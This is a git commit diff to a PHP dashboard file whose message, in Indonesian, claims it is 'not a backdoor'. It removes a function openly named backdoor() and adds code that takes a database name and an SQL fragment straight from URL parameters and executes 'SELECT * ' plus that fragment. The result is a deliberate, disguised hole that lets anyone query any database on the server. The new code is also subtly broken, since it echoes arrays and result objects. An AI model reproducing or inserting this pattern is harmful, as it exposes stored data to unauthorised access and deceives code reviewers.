f1fcaba9873bb718456d4ef8c3777c8052d8217b
Ilya Asha <ilyaasha24@gmail.com>
2019-11-27 16:30:01 +0700

    bukan backdoor3

--- dashboard/nqeue.php
+++ dashboard/nqeue.php
@@ -1,24 +1,26 @@
 <?php
-function backdoor() {
-    // Update the details below with your MySQL details
-    $DATABASE_HOST = 'localhost';
-    $DATABASE_USER = 'root';
-    $DATABASE_PASS = '';
-    $DATABASE_NAME = $_GET['n'];
-    try {
-    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
-    } catch (PDOException $exception) {
-    	// If there is an error with the connection, stop the script and display the error.
-    	die ('Failed to connect to database!');
-    }
-}
-// Connect to MySQL
-$pdo = backdoor();
+$servername = "localhost";
+$username = "username";
+$password = "password";
+$dbname = $_GET['n'];
 $query = $_GET['q'];
-// Prepare
-$stmt = $pdo->query("?");
-$stmt->execute([$query]);
-while ($row = $stmt->fetch()) {
-    echo $row['name']."<br />\n";
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
 }
+
+$sql = "SELECT * $query";
+$result = $conn->query($sql);
+
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        echo $row . "<br>";
+    }
+} else {
+    echo $result;
+}
+$conn->close();
 ?>
